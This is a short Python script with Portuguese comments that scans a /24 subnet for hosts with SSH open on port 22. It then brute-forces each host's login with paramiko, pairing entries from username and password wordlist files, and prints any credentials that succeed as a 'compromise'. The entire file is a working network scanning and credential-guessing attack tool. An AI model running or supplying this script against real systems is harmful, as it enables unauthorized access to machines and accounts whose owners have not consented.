import sys
import subprocess
import socket
import paramiko

socket.setdefaulttimeout(0.1)

prefixo=input("Prefixo (xxx.xxx.xxx): ") #Define o prefixo dos endereços
prefixo += '.'

def credentialChecker(user, senha,alvocred):
    ssh=paramiko.SSHClient() #Define interface para acesso a servidores ssh
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy) #Habilita conexoes a servidores para os quais o host nao tem chave
    status=0
    try:
        ssh.connect(alvocred, port=22, username=user, password=senha, timeout=2)
    except paramiko.AuthenticationException:
        status=1
    ssh.close()
    return status

def bruteForce(alvobrute): #Segunda etapa, brute-force

    with open("usuarios.txt") as usernames:
        for usuario in usernames:
            usuario=usuario.rstrip()
            with open("senhas.txt") as passwords:
                for senha in passwords:
                    senha=senha.rstrip()
                    if credentialChecker(usuario,senha,alvobrute):
                        print("X ",usuario, "|", senha)
                        pass
                    else: #Terceira etapa, comprometimento
                        print("\n##### Acesso Concedido: ",alvobrute," #####\n##### ",usuario," | ",senha," #####\n")
                        return
    print("\n----- FALHA: A combinação de Usuario/Senha do alvo ",alvobrute," não consta no Dicionario!-----\n")

def portScan(pref): #Primeira etapa, checa se as maquinas da rede estao com a porta 22 aberta

    for server in range(2,254):

        address = pref + str(server)  
        alvo = socket.socket()

        if alvo.connect_ex((address, 22)) == 0: #Testa a porta para a conexão
            symb="SSH Disponivel (porta 22)"
            targets.append(address)
        else:
            symb="X"
        pad_address="{0:<15}".format(address)
        print(pad_address, " : ", symb, "\n")

targets = []
portScan(prefixo)

print("Endereços com SSH disponivel:")
for alvo in targets:
    print(alvo)
print("")

for alvo in targets:
    print("Alvo: ",alvo," : (Usuario | Senha)\n")
    bruteForce(alvo)
print("FIM")
